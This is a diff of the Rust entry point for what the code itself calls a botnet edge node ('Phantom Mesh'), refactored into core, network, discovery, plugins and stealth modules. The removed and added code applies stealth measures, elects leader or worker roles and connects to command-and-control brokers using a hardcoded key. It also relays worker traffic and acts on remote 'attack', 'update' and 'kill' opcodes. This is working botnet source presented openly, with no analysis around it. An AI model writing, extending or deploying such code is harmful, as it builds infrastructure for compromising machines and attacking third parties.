@@ -1,239 +1,42 @@
-mod client;
-mod bootstrapper;
-mod modules; // Import new modules
+//! # Phantom Mesh Edge Node
+//!
+//! Main entry point for the Edge botnet node.
 
-use client::PolyMqttClient;
-use modules::election::{ElectionService, NodeRole};
-use modules::zero_noise_discovery::ZeroNoiseDiscovery;
-use modules::bridge::BridgeService;
-use modules::network_watchdog::{NetworkWatchdog, run_fallback_monitor};
-use log::{info, error, warn, debug};
-use std::collections::HashSet;
+mod core;
+mod network;
+mod discovery;
+mod plugins;
+mod stealth;
+
 use std::sync::Arc;
-use std::time::{Duration, Instant};
-use tokio::time::sleep;
-use tokio::sync::mpsc;
-use rand::Rng; // Added for worker_id generation
-use modules::local_comm::{LocalTransport, LipcMsgType};
+use log::{info, error};
 
-// Configuration
-const DEDUP_TTL: u64 = 600; 
-
-// Deduplication Engine (Preserved)
-struct Deduplicator {
-    seen: HashSet<u32>, 
-    timestamps: Vec<(Instant, u32)>, 
-}
-
-impl Deduplicator {
-    fn new() -> Self {
-        Self {
-            seen: HashSet::new(),
-            timestamps: Vec::new(),
-        }
-    }
-
-    fn check_and_add(&mut self, id: u32) -> bool {
-        let now = Instant::now();
-        self.timestamps.retain(|(t, k)| {
-            if now.duration_since(*t).as_secs() > DEDUP_TTL {
-                self.seen.remove(k);
-                false 
-            } else {
-                true
-            }
-        });
-
-        if self.seen.contains(&id) {
-            return false; 
-        }
-
-        self.seen.insert(id);
-        self.timestamps.push((now, id));
-        true 
-    }
-}
+use core::{run_leader_mode, run_worker_mode};
+use discovery::{ElectionService, NodeRole, ZeroNoiseDiscovery};
 
 #[tokio::main]
 async fn main() {
     env_logger::init();
     info!("edge started");
 
-    #[cfg(target_os = "windows")]
-    modules::windows::check_and_apply_stealth();
-    
+    // Apply platform-specific stealth
+    stealth::check_and_apply_stealth();
+
+    // Start Zero-Noise Discovery daemon
     let disc = Arc::new(ZeroNoiseDiscovery::new());
     let dc = disc.clone();
     tokio::spawn(async move {
         dc.run_daemon().await;
     });
 
+    // Run election to determine role
     let election = Arc::new(ElectionService::new().await);
     let role = election.run_discovery().await;
 
+    // Execute based on role
     match role {
         NodeRole::Leader => run_leader_mode(election).await,
         NodeRole::Worker => run_worker_mode().await,
         _ => error!("Unexpected Role Unbound"),
-    }
-}
-
-async fn run_leader_mode(election: Arc<ElectionService>) {
-    info!("role: leader");
-
-    let watchdog = Arc::new(NetworkWatchdog::new());
-    
-    let wd_clone = watchdog.clone();
-    tokio::spawn(async move {
-        run_fallback_monitor(wd_clone).await;
-    });
-
-    let elec_clone = election.clone();
-    tokio::spawn(async move {
-        elec_clone.monitor_requests().await;
-    });
-
-    let master_key = [0x42; 32]; 
-    let bootstrapper = bootstrapper::ProfessionalBootstrapper::new();
-
-    let swarm_nodes = match bootstrapper.resolve().await {
-        Some(nodes) => {
-            info!("bootstrap: {} nodes", nodes.len());
-            nodes
-        },
-        None => {
-            warn!("bootstrap: failed");
-            vec![("127.0.0.1".to_string(), 1883)]
-        }
-    };
-
-    if swarm_nodes.is_empty() {
-        error!("bootstrap: no nodes");
-        return;
-    }
-
-    let (ip, port) = &swarm_nodes[0];
-    let client = Arc::new(PolyMqttClient::new(ip, *port, &master_key));
-    
-    // Channels for Client
-    let (msg_tx, msg_rx) = mpsc::channel::<Vec<u8>>(100); // Outgoing to Cloud
-    let (cmd_tx, mut cmd_rx) = mpsc::channel::<Vec<u8>>(100); // Incoming from Cloud
-
-    // Start Persistent Cloud Client (Background)
-    let client_clone = client.clone();
-    tokio::spawn(async move {
-        client_clone.start_persistent_loop(msg_rx, cmd_tx).await;
-    });
-
-    // Start Cloud Heartbeat Loop (sends via msg_tx)
-    let msg_tx_clone = msg_tx.clone();
-    let wd_heartbeat = watchdog.clone();
-    tokio::spawn(async move {
-        loop {
-            let heartbeat = b"HEARTBEAT_LEADER".to_vec();
-            if let Err(_) = msg_tx_clone.send(heartbeat).await {
-                error!("[Cloud] Failed to queue heartbeat (Channel Closed)");
-                break;
-            }
-            // Mark network alive on successful heartbeat queue
-            wd_heartbeat.mark_alive();
-            sleep(Duration::from_secs(30)).await;
-        }
-    });
-
-    // Handle Incoming Commands from Cloud
-    let wd_cmd = watchdog.clone();
-    let bridge_tx = msg_tx.clone();
-    tokio::spawn(async move {
-        while let Some(cmd) = cmd_rx.recv().await {
-            info!("cmd: {} bytes", cmd.len());
-            wd_cmd.mark_alive();
-            
-            if cmd.is_empty() { continue; }
-            
-            let opcode = cmd[0];
-            let _payload = if cmd.len() > 1 { &cmd[1..] } else { &[] };
-            
-            match opcode {
-                0x01 => {
-                    info!("cmd: attack");
-                    let _ = bridge_tx.send(cmd.clone()).await;
-                }
-                0x02 => {
-                    info!("cmd: update");
-                    let _ = bridge_tx.send(cmd.clone()).await;
-                }
-                0x03 => {
-                    info!("cmd: kill");
-                    std::process::exit(0);
-                }
-                0x04 => {
-                    info!("cmd: status");
-                }
-                _ => {
-                    warn!("cmd: 0x{:02X}", opcode);
-                }
-            }
-        }
-    });
-
-    // 2. Setup Bridge (Listen for Workers)
-    match LocalTransport::bind_server().await {
-        Ok(listener) => {
-            let bridge = BridgeService::new(msg_tx.clone());
-            let bridge = Arc::new(bridge);
-            
-            loop {
-                match listener.accept().await {
-                    Ok((stream, _addr)) => {
-                        let b = bridge.clone();
-                        tokio::spawn(async move {
-                            b.handle_worker(stream).await;
-                        });
-                    }
-                    Err(e) => error!("[Bridge] Accept Error: {}", e),
-                }
-            }
-        }
-        Err(e) => error!("[Leader] Failed to bind Local Transport: {}", e),
-    }
-}
-
-
-
-async fn run_worker_mode() {
-    info!("[Modes] Entering WORKER Mode. Disabling Internet. Connecting to Leader.");
-    
-    // Generate a temporary specific Worker ID
-    let worker_id = rand::thread_rng().gen::<u64>();
-
-    // Loop to maintain connection to Leader
-    loop {
-        match LocalTransport::connect_client().await {
-            Ok(mut stream) => {
-                info!("[Worker] Connected to Leader. Sending LIPC Hello.");
-                
-                // 1. Send Hello
-                if let Err(e) = LocalTransport::write_frame(&mut stream, worker_id, LipcMsgType::Hello, &[]).await {
-                    error!("[Worker] Failed to send Hello: {}", e);
-                    continue;
-                }
-
-                // 2. Main Loop
-                loop {
-                    let msg = b"HEARTBEAT_WORKER";
-                    if let Err(e) = LocalTransport::write_frame(&mut stream, worker_id, LipcMsgType::Data, msg).await {
-                        error!("[Worker] Failed to write to Leader: {}", e);
-                        break; // Reconnect
-                    }
-                    debug!("[Worker] Sent LIPC Data");
-                    sleep(Duration::from_secs(10)).await;
-                }
-            }
-            Err(e) => {
-                warn!("[Worker] Failed to connect to Leader: {}. Retrying in 5s...", e);
-                sleep(Duration::from_secs(5)).await;
-            }
-        }
     }
 }
